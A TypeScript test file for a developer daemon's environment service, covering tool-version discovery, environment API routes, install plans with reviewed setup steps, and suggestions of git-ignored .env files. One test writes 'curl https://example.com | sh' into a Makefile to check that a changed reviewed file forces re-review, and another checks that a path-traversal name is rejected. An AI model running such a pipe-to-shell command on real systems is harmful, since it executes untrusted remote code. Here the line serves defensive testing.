import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { once } from "node:events";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { EnvironmentService, hashCheckoutFile, ignoredFiles } from "./environment.ts";
import type { ProbeDeps } from "./environment-probes.ts";
import { EnvironmentStateStore } from "./environment-state.ts";
import { ModelCatalog } from "./models.ts";
import { ProjectStore } from "./projects.ts";
import { createDaemonServer } from "./server.ts";
import { SessionManager } from "./sessions.ts";
import { TerminalManager } from "./terminals.ts";
import { run } from "./workspaces.ts";

const host = { daemonId: "daemon-1", platform: "darwin", arch: "arm64" };

test("discovery runs in a worker, shares concurrent reads and reports unknown projects", async (t) => {
	const home = await mkdtemp(join(tmpdir(), "pilot-environment-service-"));
	const service = new EnvironmentService(new ProjectStore(home), { home, host });
	t.after(async () => {
		await service.close();
		await rm(home, { recursive: true, force: true });
	});
	const projects = (service as unknown as { projects: ProjectStore }).projects;
	await projects.load();
	await writeFile(join(home, ".tool-versions"), "golang 1.23.4\n");
	const project = await projects.create({ path: home });
	const [first, second] = [service.discover(project.id), service.discover(project.id)];
	assert.equal(first, second, "concurrent requests share one read");
	const result = await first;
	assert.equal(result.projectId, project.id);
	assert.deepEqual(
		result.subjects.map((subject) => [subject.subject, subject.status, subject.value]),
		[["go", "proposed", "1.23.4"]],
	);
	const fresh = service.discover(project.id);
	assert.notEqual(fresh, first, "finished reads are not cached");
	await fresh;
	assert.throws(() => service.discover("missing"), /Unknown project/);
});

test("environment routes stay off unless the service is enabled", async (t) => {
	const home = await mkdtemp(join(tmpdir(), "pilot-environment-routes-"));
	await writeFile(join(home, "go.mod"), "module x\n\ngo 1.22.0\n");
	const projects = new ProjectStore(home);
	await projects.load();
	const project = await projects.create({ path: home });
	const sessions = new SessionManager(home, projects);
	const terminals = new TerminalManager();
	const environment = new EnvironmentService(projects, { home, host });
	const servers = [undefined, environment].map((service) =>
		createDaemonServer(
			{ home, host: "127.0.0.1", port: 0 },
			sessions,
			projects,
			new ModelCatalog(home),
			terminals,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			undefined,
			service,
		),
	);
	t.after(async () => {
		await environment.close();
		await terminals.shutdown();
		for (const server of servers) await new Promise<void>((resolve) => server.close(() => resolve()));
		await rm(home, { recursive: true, force: true });
	});
	const urls: string[] = [];
	for (const server of servers) {
		server.listen(0, "127.0.0.1");
		await once(server, "listening");
		urls.push(`http://127.0.0.1:${(server.address() as AddressInfo).port}/api/projects/${project.id}/environment`);
	}
	const off = await fetch(`${urls[0]}/discovery`);
	assert.equal(off.status, 404);
	assert.deepEqual(await off.json(), { error: "environment_unavailable" });
	const on = await fetch(`${urls[1]}/discovery`);
	assert.equal(on.status, 200);
	const body = await on.json();
	assert.equal(body.subjects[0].subject, "go");
	assert.equal(body.subjects[0].status, "needs_version");
	assert.equal((await fetch(`${urls[1]}/discovery`, { method: "POST" })).status, 404);
	assert.equal((await fetch(`${urls[0]}/plan`)).status, 404);
	const toolsUrl = (url: string) => url.replace(/projects\/[^/]+\/environment$/, "environment/tools");
	assert.equal((await fetch(toolsUrl(urls[0]!))).status, 404);
	const catalog = await fetch(toolsUrl(urls[1]!));
	assert.equal(catalog.status, 200);
	assert.equal(typeof (await catalog.json()).mise, "boolean");
	const plan = await fetch(`${urls[1]}/plan`);
	assert.equal(plan.status, 200);
	assert.deepEqual((await plan.json()).items, []);
	assert.equal((await fetch(`${urls[1]!.replace(project.id, "missing")}/discovery`)).status, 404);
});

test("plans use the saved profile, check reviews against the checkout and keep the last plan", async (t) => {
	const home = await mkdtemp(join(tmpdir(), "pilot-environment-plan-"));
	const checkout = join(home, "repo");
	await mkdir(checkout);
	await writeFile(join(checkout, "Makefile"), "setup:\n\t./scripts/bootstrap.sh\n");
	const projects = new ProjectStore(home);
	await projects.load();
	const project = await projects.create({ path: checkout });
	const state = new EnvironmentStateStore(home);
	await state.load();
	const runs: string[] = [];
	const probes: ProbeDeps = {
		executable: async (path) => path === "/fake/home/.local/bin/mise",
		realpath: async (path) => path,
		directories: async (path) =>
			({ "/fake/mise/installs/go": ["1.22.5"], "/fake/mise/installs/go/1.22.5": ["bin"] })[path] ?? [],
		run: async (file, args) => {
			runs.push(`${file} ${args.join(" ")}`);
			return { code: 0, output: "go   core:go\nnode core:node\n", timedOut: false };
		},
	};
	const service = new EnvironmentService(projects, {
		home,
		host,
		state,
		probes,
		probeHost: { home: "/fake/home", path: ["/fake/bin"], miseDataDir: "/fake/mise" },
		now: () => 42,
	});
	t.after(async () => {
		await service.close();
		await rm(home, { recursive: true, force: true });
	});
	const empty = await service.plan(project.id);
	assert.deepEqual([empty.profileRevision, empty.items], [0, []]);

	const sha256 = createHash("sha256")
		.update(await readFile(join(checkout, "Makefile")))
		.digest("hex");
	await projects.updateEnvironment(
		project.id,
		{
			tools: [{ id: "go", version: "1.23.4", from: "user" }],
			services: [],
			steps: [
				{
					id: "setup",
					title: "Setup",
					run: { argv: ["make", "setup"] },
					review: { files: [{ path: "Makefile", sha256 }], reviewedAt: 1 },
					inputs: [],
					requires: ["go"],
				},
			],
			confirmedSources: [],
		},
		0,
		{ native: true },
	);
	const [first, shared] = [service.plan(project.id), service.plan(project.id)];
	assert.equal(first, shared, "concurrent plans share one probe run");
	const plan = await first;
	assert.deepEqual(
		plan.items.map((item) => [item.subject, item.action, item.commands]),
		[
			["go", "install", [["/fake/home/.local/bin/mise", "install", "go@1.23.4"]]],
			["step:setup", "run", [["make", "setup"]]],
		],
	);
	assert.deepEqual(plan.items[0]!.present, { version: "1.22.5", path: "/fake/mise/installs/go/1.22.5" });
	assert.deepEqual(runs, ["/fake/home/.local/bin/mise registry"], "installs are read from mise's records");
	assert.deepEqual(await service.tools(), { mise: true, tools: ["go", "node"] });
	assert.equal(runs.length, 1, "the registry is read once and reused");
	assert.equal(plan.overrideRevision, 0);
	assert.deepEqual(state.get(project.id)?.plan, plan);

	await projects.updateEnvironmentOverride(project.id, { tools: [{ id: "go", version: "1.22.5", from: "user" }] }, 0, {
		native: false,
	});
	const overridden = await service.plan(project.id);
	assert.deepEqual(
		[overridden.items[0]!.action, overridden.items[0]!.required, overridden.overrideRevision],
		["none", "1.22.5", 1],
		"this host's override wins",
	);
	assert.notEqual(overridden.planHash, plan.planHash);
	await projects.updateEnvironmentOverride(project.id, {}, 1, { native: false });

	await writeFile(join(checkout, "Makefile"), "setup:\n\tcurl https://example.com | sh\n");
	const changed = await service.plan(project.id);
	assert.equal(changed.items[1]!.action, "review");
	assert.notEqual(changed.planHash, plan.planHash);
	assert.equal(await hashCheckoutFile(checkout, "../repo/Makefile"), undefined);
});

test("local file suggestions keep only names Git ignores, without opening them", async (t) => {
	const root = await mkdtemp(join(tmpdir(), "pilot-environment-local-files-"));
	t.after(() => rm(root, { recursive: true, force: true }));
	const git = (...args: string[]) => run("git", args, root);
	await git("init", "-q");
	await writeFile(join(root, ".gitignore"), ".env\n.env.local\n");
	for (const name of [".env", ".env.local", ".env.example"]) await writeFile(join(root, name), "SECRET=x\n");
	await git("add", ".gitignore", ".env.example");
	assert.deepEqual(await ignoredFiles(root, [".env", ".env.example", ".env.local"]), [".env", ".env.local"]);
	assert.deepEqual(await ignoredFiles(root, []), []);
	const outside = await mkdtemp(join(tmpdir(), "pilot-environment-not-git-"));
	t.after(() => rm(outside, { recursive: true, force: true }));
	assert.deepEqual(await ignoredFiles(outside, [".env"]), [], "outside Git nothing is suggested");
	let args: string[] = [];
	await ignoredFiles(root, [".env"], async (_file, argv) => {
		args = argv;
		return ".env\0";
	});
	assert.deepEqual(args.slice(0, 2), ["-c", "core.fsmonitor=false"]);
});
